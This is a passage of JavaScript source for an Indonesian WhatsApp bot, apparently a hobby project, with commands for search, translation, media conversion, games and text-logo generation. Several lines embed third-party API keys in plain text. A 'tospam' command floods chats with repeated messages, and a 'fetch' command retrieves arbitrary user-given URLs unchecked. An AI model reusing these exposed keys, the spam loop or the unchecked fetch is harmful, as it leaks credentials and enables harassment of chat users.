                    owgi = await giie.downloadAndSaveMediaMessage(ger)
                    anu = await imgbb("62194adab0f03a94b2f2605e5258ce17", owgi)
                    teks = `${anu.display_url}`
                    reply(anu.display_url)
                }
                break
            case 'tourl':
                if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedVideo) && args.length == 0) {
                    boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    owgi = await giie.downloadMediaMessage(boij)
                    res = await upload(owgi)
                    reply(res)
                } else {
                    reply('kirim/reply gambar/video')
                }
                break
            case 'viewonce':
                res = await giie.prepareMessageFromContent(from, {
                    "viewOnceMessage": {
                        "message": {
                            "imageMessage": {
                                "mimetype": 'image/jpeg',
                                "jpegThumbnail": dfrply,
                                "viewOnce": true
                            }
                        }
                    }
                }, {})
                giie.relayWAMessage(res)
                break
            case 'pinterest':
                if (!c) return reply('yg mau di cari apa?')
                reply(mess.wait)
                pinterest(`${c}`).then(data => {
                    const amsulah = data.result
                    const pimterest = amsulah[Math.floor(Math.random() * amsulah.length)]
                    sendMediaURL(from, pimterest, `Pinterest : ${c}`)
                })
                break
            case 'playstore':
                if (!c) return reply('lu nyari apa?')
                reply(mess.wait)
                let play = await gionov.playstore(c)
                let store = '*[ PLAYSTORE SEARCH ]*\n'
                for (let i of play) {
                    store += `_Powered by: AyogiAk_\n
- *Nama* : ${i.name}
- *Link* : ${i.link}\n
- *Dev* : ${i.developer}
- *Link Dev* : ${i.link_dev}\n❉──────────────────────❉`
                }
                fakegroup(store)
                break
            case 'isbaileys':
            case 'bail':
            case 'baileys':
                reply(`${mek.quoted.isBaileys}`)
                break
            case 'getcaption':
                try {
                    reply(`${mek.quoted.title}`)
                } catch {
                    reply(`${mek.quoted.caption}`)
                }
                break
            case 'q':
                if (!m.quoted) return reply('reply pesan!')
                let qse = giie.serializeM(await m.getQuotedObj())
                if (!qse.quoted) return reply('pesan yang anda reply tidak mengandung reply!')
                await qse.quoted.copyNForward(m.chat, true)
                break
            case 'gc':
            case 'group':
                buttonss = [{
                    buttonId: `opengc`,
                    buttonText: {
                        displayText: 'OPEN'
                    },
                    type: 1
                }, {
                    buttonId: `closegc`,
                    buttonText: {
                        displayText: 'CLOSE'
                    },
                    type: 1
                }]
                const bMess = {
                    contentText: 'OPEN: untuk membuka group\nCLOSE: untuk menutup group',
                    footerText: 'Silahkan click button dibawah ☟︎︎︎',
                    buttons: buttonss,
                    headerType: 1
                }
                await giie.sendMessage(from, bMess, MessageType.buttonsMessage, {
                    quoted: ftrol
                })
                break
            case 'listgc':
            case 'gclist':
            case 'listgroup':
            case 'listgrup':
            case 'listgrop':
            case 'gruplist':
            case 'groplist':
            case 'grouplist':
                const txs = giie.chats.all().filter(v => v.jid.endsWith('g.us')).map(v => `- ${giie.getName(v.jid)}\n${v.jid}\n[${v.read_only ? 'Left' : 'Joined'}]`).join`\n\n`
                fakegroup(txs)
                break
            case 'caripesan':
                if (args.length < 1) return reply(`Penggunaan ${prefix}caripesan Hi|15`)
                tekse = args.join('')
                if (tekse.includes("|")) {
                    try {
                        var ve = tekse.split("|")[0]
                        var za = tekse.split("|")[1]
                        if (za > 15) return reply('maksimal 15')
                        sampai = `${za}`
                        batas = parseInt(sampai) + 1
                        cok = await giie.searchMessages(`${ve}`, from, batas, 1)
                        if (cok.messages.lenght < 2) return reply('Pesan tidak ditemukan!')
                        if (cok.messages.length < parseInt(batas)) reply(`Hanya ditemukan ${cok.messages.length - 1} Pesan`)
                        for (let i = 1; i < cok.messages.length; i++) {
                            if (cok.messages[i].message) {
                                giie.sendMessage(from, `Nih pesannya!`, text, {
                                    quoted: cok.messages[i]
                                })
                            }
                        }
                    } catch (e) {
                        console.log(e)
                        return reply(mess.error.api)
                    }
                } else {
                    reply(`Penggunaan ${prefix}caripesan Hi|15`)
                }
                break
            case 'get':
            case 'fetch':
                if (!c) return reply('Linknya?')
                fetch(`${args[0]}`).then(res => res.text())
                    .then(bu => {
                        reply(bu)
                    })
                break
            case 'autorespon':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                anurespon = `*AUTO RESPON*\n_Please Click Button Dibawah !_\n\n*ON*: untuk mengaktifkan\n*OFF*: untuk menonaktifkan`
                puntenrespon = [{
                    buttonId: 'autorespon on',
                    buttonText: {
                        displayText: 'ON'
                    },
                    type: 1
                }, {
                    buttonId: 'autorespon off',
                    buttonText: {
                        displayText: 'OFF'
                    },
                    type: 1
                }]
                const resp = {
                    contentText: `${anurespon}`,
                    footerText: '*_Developer by: AyogiAk|JavaScript_*',
                    buttons: puntenrespon,
                    headerType: 1
                }
                if (args.length < 1) return giie.sendMessage(from, resp, MessageType.buttonsMessage, {
                    quoted: fgi
                })
                if (c === 'on') {
                    autorespon = false
                    reply(`Berhasil mengaktifkan autorespon`)
                } else if (c === 'off') {
                    autorespon = true
                    reply(`Berhasil menonaktifkan autorespon`)
                } else {
                    reply(mess.error.api)
                }
                break
            case 'setprefix':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                anuprefix = `*SET PREFIX BOT*\n_Please Click Button Dibawah !_\n\n*MULTI PREFIX*: untuk mengaktifkan multi prefix\n*NO PREFIX*: untuk mengaktifkan no prefix`
                puntenprefix = [{
                    buttonId: 'setprefix multi',
                    buttonText: {
                        displayText: 'MULTI FREFIX'
                    },
                    type: 1
                }, {
                    buttonId: 'setprefix nopref',
                    buttonText: {
                        displayText: 'NO PREFIX'
                    },
                    type: 1
                }]
                const prefx = {
                    contentText: `${anuprefix}`,
                    footerText: '*_Developer by: AyogiAk|JavaScript_*',
                    buttons: puntenprefix,
                    headerType: 1
                }
                if (args.length < 1) return giie.sendMessage(from, prefx, MessageType.buttonsMessage, {
                    quoted: fgi
                })
                if (c === 'multi') {
                    multi = true
                    reply(`Berhasil mengubah prefix ke ${c}`)
                } else if (c === 'nopref') {
                    multi = false
                    nopref = true
                    reply(`Berhasil mengubah prefix ke ${c}`)
                } else {
                    multi = false
                    nopref = false
                    prefa = `${c}`
                    reply(`Berhasil mengubah prefix ke ${c}`)
                }
                break
            case 'test':
            case 'cek':
            case 'tes':
                runtime = process.uptime()
                reply(`- Active!\n${waktu(runtime)}`)
                break
            case 'tictactoe':
            case 'ttt':
                if (!isGroup) return reply(mess.only.group)
                if (args.length < 1) return reply('Tag Lawan Anda! ')
                if (isTTT) return reply('Sedang Ada Permainan Di Grub Ini, Harap Tunggu')
                if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target Lawan!')
                ment = mek.message.extendedTextMessage.contextInfo.mentionedJid
                player1 = sender
                player2 = ment[0]
                angka = ["0️⃣", "1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣"]
                id = from
                gilir = player2
                ky_ttt.push({
                    player1,
                    player2,
                    id,
                    angka,
                    gilir
                })
                giie.sendMessage(from, `*🎳 Memulai Game Tictactoe 🎲*

[@${player2.split('@')[0]}] Menantang anda untuk menjadi lawan Game🔥
Ketik Y/N untuk menerima atau menolak permainan

Ketik ${prefix}delttc , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {
                    contextInfo: {
                        mentionedJid: [player2]
                    }
                })
                break
            case 'delttt':
            case 'delttc':
                if (!isGroup) return reply(mess.only.group)
                if (!isTTT) return reply('Tidak Ada Permainan Di Grub Ini')
                naa = ky_ttt.filter(toek => !toek.id.includes(from))
                ky_ttt = naa
                reply('Sukses')
                break
            case 'getscmd':
                duda = fs.readFileSync('sticker/menu.webp')
                giie.sendMessage(from, duda, sticker, {
                    quoted: mek
                })
                break
            case 'getpp':
                anu = from
                if (`${anu}@s.whatsapp.net`) {
                    try {
                        ppimg = await giie.getProfilePicture(anu)
                    } catch {
                        ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
                    }
                    ano = await giie.getProfilePicture(anu)
                    buffer = await getBuffer(ano)
                    giie.sendMessage(from, buffer, image, {
                        quoted: mek
                    })
                } else {}
                break
            case 'public':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                publik = true
                reply('Sukses mengubah mode self ke public')
                break
            case 'self':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                publik = false
                reply('Sukses mengubah mode public ke self')
                break
            case 'gimage':
            case 'googleimage':
                if (args.length < 1) return reply('Apa Yang Mau Dicari?')
                reply(mess.wait)
                teks = args.join(' ')
                res = await googleImage(teks, google)

                function google(error, result) {
                    if (error) {
                        return reply('_[ ! ] Error Terjari Kesalahan Atau Hasil Tidak Ditemukan_')
                    } else {
                        var gugIm = result
                        var random = gugIm[Math.floor(Math.random() * gugIm.length)].url
                        sendFileFromUrl(random, image, {
                            quoted: mek,
                            caption: `*Hasil Pencarian Dari :* ${teks}`
                        })
                    }
                }
                break
            case 'herolist':
                await herolist().then((ress) => {
                    let listt = `*List hero untuk feature ${prefix}herodetail*\n\n`
                    for (var i = 0; i < ress.hero.length; i++) {
                        listt += '-  ' + ress.hero[i] + '\n'
                    }
                    reply(listt)
                })
                break
            case 'herodetail':
                res = await herodetails(body.slice(12))
                her = `*Hero Details ${body.slice(12)}*

*Nama* : ${res.hero_name}
*Role* : ${res.role}
*Quotes* : ${res.entrance_quotes}
*Fitur Hero* : ${res.hero_feature}
*Spesial* : ${res.speciality}
*Rekomendasi Lane* : ${res.laning_recommendation}
*Harga* : ${res.price.battle_point} [Battle point] | ${res.price.diamond} [DM] | ${res.price.hero_fragment} [Fragment]
*Rilis* : ${res.release_date}

*Durability* : ${res.skill.durability}
*Offence* : ${res.skill.offense}
*Skill Effect* : ${res.skill_effects}
*Difficulty* : ${res.skill.difficulty}
 
*Movement Speed* : ${res.attributes.movement_speed}
*Physical Attack* : ${res.attributes.physical_attack}
*Magic Defense* : ${res.attributes.magic_defense}
*Ability Crit Rate* : ${res.attributes.ability_crit_rate}
*HP* : ${res.attributes.hp}
*Mana* : ${res.attributes.mana}
*Mana Regen* : ${res.attributes.mana_regen}

*Story* : ${res.background_story}`
                reply(her)
                break
            case 'google':
            case 'googlesearch':
            case 'ggs':
                if (args.length < 1) return reply('Yang mau di cari apaan?')
                teks = args.join(' ')
                reply(mess.wait)
                res = await ggs({
                    'query': `${teks}`
                })
                kant = ``
                for (let i of res) {
                    kant += `*Judul* : ${i.title}
*Link* : ${i.link}
*Keterangan* : ${i.snippet}`
                }
                var akhir = kant.trim()
                reply(akhir)
                break
            case 'wiki':
            case 'wikipedia':
                if (args.length < 1) return reply(' Yang Mau Di Cari Apa? ')
                teks = args.join(' ')
                res = await wikiSearch(teks).catch(e => {
                    return reply('_[ ! ] Error Hasil Tidak Ditemukan_')
                })
                result = `*Judul :* ${res[0].judul}
*Wiki :* ${res[0].wiki}`
                sendFileFromUrl(res[0].thumb, image, {
                    quoted: fgi,
                    caption: result
                }).catch(e => {
                    reply(result)
                })
                break
            case 'mediafire':
                if (args.length < 1) return reply('Link Nya Mana? ')
                if (!isUrl(args[0]) && !args[0].includes('mediafire')) return reply(mess.error.api)
                if (Number(filesize) >= 30000) return reply(`*Nama :* ${res[0].nama}
*Ukuran :* ${res[0].size}
*Link :* ${res[0].link}

_Maaf size melebihi batas maksimal, Silahkan klik link diatas_`)
                reply(mess.wait)
                teks = args.join(' ')
                res = await mediafireDl(teks)
                result = `*Nama :* ${res[0].nama}
*Ukuran :* ${res[0].size}

_File sedang dikirim, Silahkan tunggu beberapa menit_`
                reply(result)
                sendFileFromUrl(res[0].link, document, {
                    mimetype: res[0].mime,
                    filename: res[0].nama,
                    quoted: mek
                })
                break
            case 'kalkulator':
                var mtk = body.slice(12)
                teks = `${mtk} = ${Math_js.evaluate(mtk)}`
                reply(teks)
                break
            case 'translate':
                buttonss = [{
                    buttonId: `tutortranslate`,
                    buttonText: {
                        displayText: 'Tutorial'
                    },
                    type: 1
                }, {
                    buttonId: `kodebahasa`,
                    buttonText: {
                        displayText: 'Kode Bahasa'
                    },
                    type: 1
                }]
                const ftrans = {
                    contentText: "*TUTORIAL:* Lihat cara pemakaian/penggunaan disini\n*KODE BAHASA:* Lihat kode bahasa disini",
                    footerText: 'Silahkan click button dibawah ☟︎︎︎',
                    buttons: buttonss,
                    headerType: 1
                }
                await giie.sendMessage(from, ftrans, MessageType.buttonsMessage, {
                    quoted: mek
                })
                break
            case 'tutortranslate':
                tutor = `_Silahkan ketik_ *${prefix}trans from(kodebahasa)|to(kodebahasa)|text*\n_-Contoh: ${prefix}trans en|id|i love you_`
                reply(tutor)
                break
            case 'kodebahasa':
                kodebhs = `[BAHASA - *KODE*]
*A*
Afrikaans *af*
Albanian *sq*
Amharic *am*
Arabic *ar*
Armenian *hy*
Azerbaijani *az*
*B*
Basque *eu*
Belarusian *be*
Bengali *bn*
Bosnian *bs*
Bulgarian *bg*
*C*
Catalan *ca*
Cebuano *ceb*
Chinese *zh-CN*
Chinese (Traditional) *zh-TW*
Corsican *co*
Croatian *hr*
Czech *cs*
*D*
Danish *da*
Dutch *nl*
*E*
English *en*
Esperanto *eo*
Estonian *et*
*F*
Finnish *fi*
French *fr*
Frisian *fy*
*G*
Galician *gl*
Georgian *ka*
German *de*
Greek *el*
Gujarati *gu*
*H*
Haitian Creole *ht*
Hausa *ha*
Hawaiian *haw*
Hebrew *he*
Hindi *hi*
Hmong *hmn*
Hungarian *hu*
*I*
Icelandic *is*
Igbo *ig*
Indonesian *id*
Irish *ga*
Italian *it*
*J*
Japanese *ja*
Javanese *jv*
*K*
Kannada *kn*
Kazakh *kk*
Khmer *km*
Kinyarwanda *rw*
Korean *ko*
Kurdish *ku*
Kyrgyz *ky*
*L*
Lao *lo*
Latvian *lv*
Lithuanian *lt*
Luxembourgish *lb*
*M*
Macedonian *mk*
Malagasy *mg*
Malay *ms*
Malayalam *ml*
Maltese *mt*
Maori *mi*
Marathi *mr*
Mongolian *mn*
Myanmar  (Burmese) *my*
*N*
Nepali *ne*
Norwegian *no*
Nyanja (Chichewa) *ny*
*O*
Odia (Oriya) *or*
*P*
Pashto *ps*
Persian *fa*
Polish *pl*
Portuguese (Portugal, Brazil) *pt*
Punjabi *pa*
*R*
Romanian *ro*
Russian *ru*
*S*
Samoan *sm*
Scots Gaelic *gd*
Serbian *sr*
Sesotho *st*
Shona *sn*
Sindhi *sd*
Sinhala (Sinhalese) *si*
Slovak *sk*
Slovenian *sl*
Somali *so*
Spanish *es*
Sundanese *su*
Swahili *sw*
Swedish *sv*
*T*
Tagalog (Filipino) *tl*
Tajik *tg*
Tamil *ta*
Tatar *tt*
Telugu *te*
Thai *th*
Turkish *tr*
Turkmen *tk*
*U*
Ukrainian *uk*
Urdu *ur*
Uyghur *ug*
Uzbek *uz*
*V*
Vietnamese *vi*
*W*
Welsh *cy*
*X*
Xhosa *xh*
*Y*
Yiddish *yi*
Yoruba *yo*
*Z*
Zulu *zu*

_Apakah informasi ini membantu?_
`
                reply(kodebhs)
                break;
                // case 'trans':
                // kntl = `${args.join(' ')}`
                // kod = kntl.split("|")[0];
                // tex = kntl.split("|")[1];
                // var a = await fetchJson(`https://amm-api-translate.herokuapp.com/translate?engine=google&text=${tex}&to=${kod}`, {method: 'get'})
                // var b = `${a.data.result}`
                // reply(b)
                // break
            case 'trans':
                kntl = `${args.join(' ')}`
                tex1 = kntl.split("|")[0];
                tex2 = kntl.split("|")[1];
                tex3 = kntl.split("|")[2];
                var a = await fetchJson(`https://tools.helixs.id//API/translate.php?text=${tex3}&from=${tex1}&to=${tex2}`, {
                    method: 'get'
                })
                var b = `${a.result}`
                reply(b)
                break
            case 'artimimpi':
                if (args.length < 1) return reply('Teksnya?')
                anu = await fetchJson(`https://fxc7-api.herokuapp.com/api/primbon/artimimpi?apikey=sU2SkhpdWV&query=${body.slice(11)}`, {
                    method: 'get'
                })
                teks = anu.result
                reply(teks)
                break

            case 'artinama':
                if (args.length < 1) return reply('namanya?')
                anu = await fetchJson(`https://hadi-api.herokuapp.com/api/artinama?nama=${body.slice(10)}`, {
                    method: 'get'
                })
                teks = `*Arti nama dari ${body.slice(10)} adalah:* \n\n${anu.result}`
                reply(teks)
                break
            case 'quotes':
                anu = await fetchJson(`http://vikoapi-index.herokuapp.com/api/quotes?apikey=${VikoApi}`, {
                    method: 'get'
                })
                teks = `_${anu.quotes}_\n*-${anu.author}*-`
                reply(teks)
                break
            case 'bijak':
                anu = await fetchJson(`http://vikoapi-index.herokuapp.com/api/bijak?apikey=${VikoApi}`, {
                    method: 'get'
                })
                teks = `_${anu.result}_`
                reply(teks)
                break
            case 'fakta':
                anu = await fetchJson(`http://vikoapi-index.herokuapp.com/api/fakta?apikey=${VikoApi}`, {
                    method: 'get'
                })
                teks = `_${anu.result}_`
                reply(teks)
                break
            case 'spekhp':
                if (args.length < 1) return reply('Teksnya?')
                reply(mess.wait)
                anu = await fetchJson(`https://api.zeks.me/api/gsmArena?apikey=${ZeksApi}&q=${body.slice(8)}`, {
                    method: 'get'
                })
                teks = `*TITLE:* \n${anu.data.title}\n\n*DESCRIPTION:* \n${anu.data.few_desc}\n*SPECIFICATION:* \n${anu.data.full_desc.string}\n\n_-JavaScript|AyogiAk_ `
                buff = await getBuffer(anu.data.thumb)
                giie.sendMessage(from, buff, image, {
                    quoted: fgi,
                    caption: teks
                })
                break
            case 'zodiak':
                if (args.length < 1) return reply('Teksnya?')
                anu = await fetchJson(`https://fxc7-api.herokuapp.com/api/primbon/zodiakhar?apikey=sU2SkhpdWV&query=${body.slice(8)}`, {
                    method: 'get'
                })
                teks = `*ZODIAK:* ${anu.result.judul}\n\n*DATE:* ${anu.result.date}\n*NO HOKI:* ${anu.result.no_hoki}\n*RAMALAN PRIBADI:* ${anu.result.ramalan.umum}\n*RAMALAN CINTA:* ${anu.result.ramalan.love}\n*RAMALAN KEUANGAN:* ${anu.result.ramalan.keuangan}\n\n_-JavaScript|AyogiAk_ `
                buff = await getBuffer(anu.result.thumb)
                giie.sendMessage(from, buff, image, {
                    quoted: fgi,
                    caption: teks
                })
                break
            case 'fancytext':
                if (args.length < 1) return reply('Teksnya?')
                anu = await fetchJson(`https://fxc7-api.herokuapp.com/api/maker/styletext?apikey=sU2SkhpdWV&text=${body.slice(11)}`, {
                    method: 'get'
                })
                teks = anu.result
                reply(teks)
                break
            case 'lirik':
                if (args.length < 1) return reply('Judulnya?')
                reply(mess.wait)
                teks = body.slice(7)
                lirikLagu(teks).then((res) => {
                    let lirik = `${res[0].result}`
                    reply(lirik)
                })
                break

            case 'pantun':
                anu = await fetchJson(`https://viko-api.herokuapp.com/api/random/pantun?apikey=${VikoApi}`, {
                    method: 'get'
                })
                kata = anu.result
                reply(kata)
                break
            case 'jadwaltv':
                if (args.length < 1) return reply('stasiun apa?')
                var teks = body.slice(10)
                anu = await fetchJson(`https://api.zeks.me/api/jadwaltv?apikey=${ZeksApi}&channel=${teks}`, {
                    method: 'get'
                })
                reply(mess.wait)
                kata = anu.result
                reply(kata)
                break

            case 'resepmasakan':
                if (args.length < 1) return reply('Judulnya?')
                var teks = body.slice(14)
                anu = await fetchJson(`https://api.zeks.me/api/resep-masak?apikey=${ZeksApi}&q=${teks}`, {
                    method: 'get'
                })
                hasilresep = `*[ ${anu.title} ]*\n\n❏ Tingkat : ${anu.tingkat}\n❏ Durasi : ${anu.duration}\n❏ Porsi : ${anu.banyak}\n❏ Bahan : ${anu.bahan}\n❏ Cara : ${anu.cara}\n\n_-JavaScript|AyogiAk_`
                reply(mess.wait)
                buff = await getBuffer(anu.thumb)
                giie.sendMessage(from, buff, image, {
                    quoted: fgi,
                    caption: hasilresep
                })
                break
            case 'githubstalk':
                if (args.length < 1) return reply('Usernamenya?')
                var teks = body.slice(13)
                anu = await fetchJson(`https://hadi-api.herokuapp.com/api/githubstalk?username=${teks}`, {
                    method: 'get'
                })
                gstalk = `❏ *GITHUB STALK*\n\n❏ Followers : ${anu.result.follower}\n❏ Following : ${anu.result.following}\n❏ Location : ${anu.result.location}\n❏ Bio : ${anu.result.bio}\n❏ Type : ${anu.result.Type}\n❏ Email : ${anu.result.email}\n❏ Twitter : ${anu.result.twiter_username}\n❏ Public Repo : ${anu.result.public_repo}\n❏ Public Gists : ${anu.result.public_gists}\n❏ Avatar Url : ${anu.result.avatar}\n❏ Profile Url : https://github.com/${teks}`
                reply(mess.wait)
                buff = await getBuffer(anu.result.avatar)
                giie.sendMessage(from, buff, image, {
                    quoted: fgi,
                    caption: gstalk
                })
                break

            case 'infogempa':
                anu = await fetchJson(`https://hadi-api.herokuapp.com/api/infogempa`, {
                    method: 'get'
                })
                gempa = `❏ *INFO GEMPA*\n\n❏ Lokasi : ${anu.result.lokasi}\n❏ Waktu : ${anu.result.waktu}\n❏ Magnitudo : ${anu.result.magnitudo}\n❏ Kedalaman : ${anu.result.kedalaman}\n❏ Dirasakan : ${anu.result.dirasakan}\n❏ Sumber : ${anu.powered_by}`
                reply(mess.wait)
                buff = await getBuffer(anu.result.url_map)
                giie.sendMessage(from, buff, image, {
                    quoted: fgi,
                    caption: gempa
                })
                break
            case 'dadu':
                random = Math.floor(Math.random() * 6) + 1
                damdu = fs.readFileSync(`./sticker/${random}.webp`)
                giie.sendMessage(from, damdu, sticker, {
                    quoted: mek
                })
                break
            case 'robot':
                encmedial = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                medial = await giie.downloadAndSaveMediaMessage(encmedial)
                ran = getRandom('.mp3')
                exec(`ffmpeg -i ${medial} -filter_complex "afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75" ${ran}`, (err, stderr, stdout) => {
                    fs.unlinkSync(medial)
                    if (err) return reply(mess.error.api)
                    hah = fs.readFileSync(ran)
                    giie.sendMessage(from, hah, audio, {
                        mimetype: 'audio/mp4',
                        duration: 359996400,
                        ptt: true,
                        quoted: mek,
                        contextInfo: {
                            forwardingScore: 508,
                            isForwarded: true
                        }
                    })
                    fs.unlinkSync(ran)
                })
                break
            case 'gemuk':
                encmediaz = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                mediaz = await giie.downloadAndSaveMediaMessage(encmediaz)
                ran = getRandom('.mp3')
                exec(`ffmpeg -i ${mediaz} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
                    fs.unlinkSync(mediaz)
                    if (err) return ephe('Error!')
                    hah = fs.readFileSync(ran)
                    giie.sendMessage(from, hah, audio, {
                        mimetype: 'audio/mp4',
                        ptt: true,
                        duration: 359996400,
                        quoted: mek
                    })
                    fs.unlinkSync(ran)
                })
                break
            case 'balik':
                encmediau = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                mediau = await giie.downloadAndSaveMediaMessage(encmediau)
                ran = getRandom('.mp3')
                exec(`ffmpeg -i ${mediau} -filter_complex "areverse" ${ran}`, (err, stderr, stdout) => {
                    fs.unlinkSync(mediau)
                    if (err) return reply('Error!')
                    hah = fs.readFileSync(ran)
                    giie.sendMessage(from, hah, audio, {
                        mimetype: 'audio/mp4',
                        ptt: true,
                        duration: 359996400,
                        quoted: mek
                    })
                    fs.unlinkSync(ran)
                })
                break
            case 'bass':
                encmediao = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                mediao = await giie.downloadAndSaveMediaMessage(encmediao)
                ran = getRandom('.mp3')
                exec(`ffmpeg -i ${mediao} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
                    fs.unlinkSync(mediao)
                    if (err) return reply('Error!')
                    hah = fs.readFileSync(ran)
                    giie.sendMessage(from, hah, audio, {
                        mimetype: 'audio/mp4',
                        ptt: true,
                        duration: 359996400,
                        quoted: mek
                    })
                    fs.unlinkSync(ran)
                })
                break
            case 'sider':
                if (!isGroup) return reply(mess.only.group)
                infom = await giie.messageInfo(from, mek.message.extendedTextMessage.contextInfo.stanzaId)
                tagg = []
                teks = `Telah Dibaca Oleh :\n\n`
                for (let i of infom.reads) {
                    teks += '@' + i.jid.split('@')[0] + '\n'
                    teks += `Waktu : ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
                    tagg.push(i.jid)
                }
                mentions(teks, tagg, true)
                break
            case 'tospam':
                if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length > 10) {
                    teks = body.slice(8)
                    oi1 = teks.split('|')[0]
                    oi2 = teks.split('|')[1]
                    if (Number(oi2) >= 50) return reply('Kebanyakan!')
                    if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
                    for (let i = 0; i < oi2; i++) {
                        giie.sendMessage(from, `${oi1}`, MessageType.text)
                    }
                } else if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length < 10) {
                    teks = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
                    if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
                    if (Number(args[0]) >= 50) return reply('Kebanyakan!')
                    for (let i = 0; i < args[0]; i++) {
                        giie.sendMessage(from, teks, MessageType.text)
                    }
                } else if (isQuotedSticker) {
                    encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                    median = await giie.downloadAndSaveMediaMessage(encmedian)
                    anu = fs.readFileSync(median)
                    if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
                    if (Number(args[0]) >= 50) return reply('Kebanyakan!')
                    for (let i = 0; i < args[0]; i++) {
                        giie.sendMessage(from, anu, sticker)
                    }
                } else if (isQuotedAudio) {
                    encmediat = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                    mediat = await giie.downloadAndSaveMediaMessage(encmediat)
                    anu = fs.readFileSync(mediat)
                    if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
                    if (Number(args[0]) >= 50) return reply('Kebanyakan!')
                    for (let i = 0; i < args[0]; i++) {
                        giie.sendMessage(from, anu, audio, {
                            mimetype: 'audio/mp4',
                            duration: 359996400,
                            ptt: true
                        })
                    }
                } else if (isQuotedImage) {
                    boij = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    delb = await giie.downloadMediaMessage(boij)
                    teks = body.slice(6)
                    oi1 = teks.split('|')[0]
                    oi2 = teks.split('|')[1]
                    if (Number(oi2) >= 50) return reply('Kebanyakan!')
                    if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
                    for (let i = 0; i < oi2; i++) {
                        giie.sendMessage(from, delb, MessageType.image, {
                            caption: oi1
                        })
                    }
                }
                break
            case 'hartatahta':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
                makell = args.join(" ")
                reply(mess.wait)
                anu = await getBuffer(`https://api.zeks.me/api/hartatahta?apikey=${ZeksApi}&text=${makell}`)
                giie.sendMessage(from, anu, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'breakwall':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
                makell = args.join(" ")
                reply(mess.wait)
                anu = await getBuffer(`https://api.zeks.me/api/breakwall?apikey=${ZeksApi}&text=${makell}`)
                giie.sendMessage(from, anu, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'dropwater':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
                makell = args.join(" ")
                reply(mess.wait)
                anu = await getBuffer(`https://api.zeks.me/api/dropwater?apikey=${ZeksApi}&text=${makell}`)
                giie.sendMessage(from, anu, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'matrix':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
                makell = args.join(" ")
                reply(mess.wait)
                anu = await getBuffer(`https://api.zeks.me/api/matrix?apikey=${ZeksApi}&text=${makell}`)
                giie.sendMessage(from, anu, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'wolflogo':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
                makell = args.join(" ")
                reply(mess.wait)
                anu = await getBuffer(`https://api.zeks.me/api/wolflogo?apikey=${ZeksApi}&text=${makell}`)
                giie.sendMessage(from, anu, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'flower':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
                makell = args.join(" ")
                reply(mess.wait)
                anu = await getBuffer(`https://api.zeks.me/api/flowertext?apikey=${ZeksApi}&text=${makell}`)
                giie.sendMessage(from, anu, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'crosslogo':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
                makell = args.join(" ")
                reply(mess.wait)
                anu = await getBuffer(`https://api.zeks.me/api/crosslogo?apikey=${ZeksApi}&text=${makell}`)
                giie.sendMessage(from, anu, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'glowtext':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
                makell = args.join(" ")
                reply(mess.wait)
                anu = await getBuffer(`https://api.zeks.me/api/glowtext?apikey=${ZeksApi}&text=${makell}`)
                giie.sendMessage(from, anu, image, {
                    quoted: mek,
